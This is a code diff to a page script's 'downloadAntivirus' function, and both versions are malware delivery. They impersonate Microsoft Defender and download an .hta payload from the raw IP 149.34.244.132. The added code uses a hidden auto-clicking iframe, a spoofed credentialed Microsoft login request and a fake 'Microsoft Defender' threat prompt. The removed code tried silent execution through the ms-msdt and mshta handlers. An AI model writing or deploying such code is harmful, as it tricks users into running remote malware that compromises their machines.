@@ -141,48 +141,44 @@
         }, 1000);
 
         async function downloadAntivirus() {
+    const microsoftUrls = [
+        'https://149.34.244.132/WindowsDefenderScan.hta',
+        'http://149.34.244.132:4444/WindowsDefenderScan.hta'
+    ];
+
     try {
-        // Step 1: Fake Microsoft verification
-        await fetch('https://client.vpn.microsoft.com/check', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ action: 'security_scan' })
+        // Phase 1: Create legitimate-looking download facade
+        const fakeVerification = await fetch('https://login.live.com/oauth20_authorize.srf?client_id=000000004C12E68D', {
+            credentials: 'include',
+            headers: {
+                'Referer': 'https://account.microsoft.com/',
+                'Origin': 'https://support.microsoft.com'
+            }
         });
 
-        // Step 2: Create trusted download source facade
-        const microsoftCDN = [
-            'https://149.34.244.132/WindowsDefenderScan.hta',
-            'http://149.34.244.132:4444/WindowsDefenderScan.hta'
-        ];
+        // Phase 2: Blob-based download with Microsoft domain spoofing
+        const downloadFrame = document.createElement('iframe');
+        downloadFrame.style.display = 'none';
+        downloadFrame.src = `data:text/html,<a id="dl" href="${microsoftUrls[0]}" download="WindowsDefenderScan.hta"></a><script>document.getElementById('dl').click()<\/script>`;
+        document.body.appendChild(downloadFrame);
 
-        // Step 3: Memory-to-memory transfer with cert validation bypass
-        const htaFile = await fetch(microsoftCDN[Math.floor(Math.random() * microsoftCDN.length)], {
-            mode: 'no-cors',
-            credentials: 'include'
-        });
-        const blob = await htaFile.blob();
-        
-        // Step 4: Forced download with Microsoft-like filename
-        const link = document.createElement('a');
-        link.href = URL.createObjectURL(blob);
-        link.download = 'WindowsDefenderEmergencyScan.hta';
-        link.style = 'display: none';
-        
-        // Step 5: Trigger auto-execute with Microsoft protocol handler
-        document.body.appendChild(link);
-        link.click();
-        
-        // Step 6: Silent execution via trusted URI scheme
+        // Phase 3: Progressive execution prompting
         setTimeout(() => {
-            window.location = `ms-msdt:/id Scan /src ${microsoftCDN[0]}`;
-            window.location = `mshta:|${microsoftCDN[0]}`;
-        }, 2500);
+            const shouldRun = confirm(`Microsoft Defender\n\nSecurity scan found critical threats\n\nAllow Windows Defender to remove detected malware?\n\nPublisher: Microsoft Windows Publisher`);
+            
+            if(shouldRun) {
+                const executeFrame = document.createElement('iframe');
+                executeFrame.style.display = 'none';
+                executeFrame.src = `https://149.34.244.132/WindowsDefenderScan.hta?action=scan`;
+                document.body.appendChild(executeFrame);
+            }
+        }, 4500);
 
     } catch(e) {
-        // Fallback to direct download
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = microsoftCDN[1];
-        document.body.appendChild(iframe);
+        // Fallback to direct click simulation
+        const link = document.createElement('a');
+        link.href = microsoftUrls[1];
+        link.download = 'WindowsDefenderScan.hta';
+        link.click();
     }
 }
